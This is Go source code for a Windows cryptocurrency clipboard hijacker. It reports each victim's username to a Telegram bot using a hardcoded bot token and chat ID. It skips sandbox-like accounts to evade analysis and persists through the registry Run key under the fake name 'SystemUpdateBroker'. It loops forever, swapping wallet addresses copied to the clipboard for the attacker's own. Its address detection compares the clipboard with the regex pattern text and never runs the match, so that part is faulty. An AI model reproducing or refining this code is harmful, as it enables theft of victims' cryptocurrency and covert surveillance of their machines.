package main

import (
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"path/filepath"
	"regexp"

	"github.com/atotto/clipboard"
	"golang.org/x/sys/windows/registry"
)

func main() {

	user, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	bottoken := "8018399354:AAED048K57xNx-8AfaGqhHkzfTa-nZ2tGZA"
	chatid := "6836733049"
	message := ("New File ran, Username:" + user.Username + "\n")
	telegramurl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", bottoken)
	data := url.Values{}
	data.Set("chat_id", chatid)
	data.Set("text", message)
	resp, err := http.PostForm(telegramurl, data)
	if err != nil {
		fmt.Println("failed too send info too telegram", err)
	}
	defer resp.Body.Close()

	blockedusers := map[string]bool{
		"admin":              true,
		"administrator":      true,
		"WDAGUtilityAccount": true,
	}

	if blockedusers[user.Username] {
		os.Exit(0)
	}

	exepath, err := filepath.Abs(os.Args[0])
	if err != nil {
		log.Fatal(err)
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
	if err != nil {
		log.Fatal(err)
	}
	defer key.Close()

	err = key.SetStringValue("SystemUpdateBroker", exepath)
	if err != nil {
		panic(err)
	}
	for {
		BTC := "bitcoin address here"
		ETH := "Etherium address here"
		LTC := "litecoin address here"
		ltcregexp := regexp.MustCompile("/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/")
		ltcfmt := ltcregexp.String()
		ethregexp := regexp.MustCompile("/(\b0x[a-f0-9]{40}\b)/g")
		btcregexp := regexp.MustCompile("/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/")
		btcb32regexp := regexp.MustCompile("/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/")
		btcb32 := btcb32regexp.String()
		ethfmt := ethregexp.String()
		btcfmt := btcregexp.String()
		content, err := clipboard.ReadAll()

		if err != nil {
			log.Fatal(err)
		}

		if content == btcfmt || content == btcb32 {
			fmt.Println("bitcoin detected")
			clipboard.WriteAll(BTC)
		}
		if content == ethfmt {
			fmt.Println("etherium detected")
			clipboard.WriteAll(ETH)
		}
		if content == ltcfmt {
			clipboard.WriteAll(LTC)
			fmt.Println("Litecoin detected")
		}
	}

}
